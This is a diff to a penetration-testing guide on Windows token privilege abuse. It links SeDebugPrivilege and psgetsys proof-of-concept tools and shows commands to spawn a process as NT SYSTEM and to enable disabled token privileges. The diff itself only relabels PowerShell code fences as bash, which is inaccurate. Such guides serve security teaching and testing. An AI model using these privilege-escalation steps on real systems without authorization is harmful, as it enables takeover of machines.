@@ -137,7 +137,7 @@ If you want to get a `NT SYSTEM` shell you could use:
 - [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
 - [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
 
-```powershell
+```bash
 # Get the PID of a process running as NT SYSTEM
 import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
 ```
@@ -154,7 +154,7 @@ The **tokens that appear as Disabled** can be enable, you you actually can abuse
 
 If you have tokens disables, you can use the script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) to enable all the tokens:
 
-```powershell
+```bash
 .\EnableAllTokenPrivs.ps1
 whoami /priv
 ```
